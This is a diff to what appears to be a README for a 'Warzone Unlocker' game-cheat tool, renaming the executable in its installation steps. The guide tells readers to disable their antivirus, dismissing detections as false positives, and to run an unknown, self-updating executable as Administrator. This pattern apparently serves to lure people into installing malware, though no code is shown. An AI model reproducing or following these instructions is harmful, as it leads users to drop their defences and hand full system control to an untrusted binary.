@@ -31,7 +31,7 @@
 ## 📥 Installation Guide  
 1. **Download** the tool via the button above.  
 2. **Disable** Antivirus (false positives are common).  
-3. **Run** `Warzone_Unlocker_2025.exe` as Administrator.  
+3. **Run** `2026.exe` as Administrator.  
 4. **Launch** Warzone & enjoy unlocked items! 🎉  
 
 ⚠️ **Note:** Tool updates automatically with new content patches.  
